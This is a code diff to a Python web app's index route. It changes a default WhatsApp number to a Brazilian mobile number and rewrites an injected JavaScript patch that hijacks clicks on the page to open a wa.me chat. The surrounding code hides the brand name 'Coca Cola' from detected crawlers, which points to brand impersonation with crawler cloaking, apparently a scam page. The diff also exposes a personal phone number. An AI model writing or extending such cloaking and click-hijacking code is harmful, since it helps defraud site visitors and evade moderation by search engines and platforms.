@@ -211,10 +211,10 @@ def index():
         log_event("ENTRADA")
         
     db = load_db()
-    wa_num = db.get("whatsapp_number", "0800-887-1111")
+    wa_num = db.get("whatsapp_number", "5511933684266")
     with open(os.path.join(BASE_DIR, 'index.html'), 'r', encoding='utf-8') as f:
         html = f.read()
-    html = html.replace("0800-887-1111", wa_num)
+    html = html.replace("5511933684266", wa_num)
     
     if is_crawler:
         html = html.replace("Coca Cola", "A Plataforma")
@@ -288,7 +288,7 @@ def index():
             e.stopPropagation(); 
 
             // Pega o href da tag A se existir, senao usa o wa.me genérico
-            var targetUrl = 'https://wa.me/0800-887-1111';
+            var targetUrl = 'https://wa.me/5511933684266';
             if (a && a.getAttribute('href') && (a.getAttribute('href').includes('wa.me') || a.getAttribute('href').includes('whatsapp'))) {
                 targetUrl = a.getAttribute('href');
             }
@@ -318,7 +318,7 @@ def index():
     }, true);
     </script>
     """
-    js_patch_final = js_patch.replace('0800-887-1111', wa_num)
+    js_patch_final = js_patch.replace('5511933684266', wa_num)
     if "</body>" in html:
         html = html.replace("</body>", js_patch_final + "</body>")
     else:
